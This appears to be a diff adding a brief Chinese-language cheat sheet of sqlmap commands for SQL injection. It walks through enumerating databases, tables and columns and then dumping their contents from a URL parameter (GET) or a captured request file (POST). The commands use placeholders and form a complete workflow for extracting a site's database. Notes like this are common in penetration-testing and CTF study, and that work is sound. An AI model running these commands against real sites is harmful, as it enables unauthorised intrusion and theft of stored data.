@@ -1,0 +1,19 @@
+GET请求方式
+
+python sqlmap.py -u "网址（一般要有参数）" -dbs -batch
+
+python sqlmap.py -u "网址" -D 数据库名 -tables -batch
+
+python sqlmap.py -u "网址" -D 数据库名 -T 表名 -columns -batch
+
+python sqlmap.py -u "网址" -D 数据库名 -T 表名 -C 表里内容，表里内容，... -dump -batch
+
+
+
+
+
+POST请求方式
+
+python sqlmap.py -r 抓包内容.txt -dbs -batch
+
+接下来跟上面一个顺序
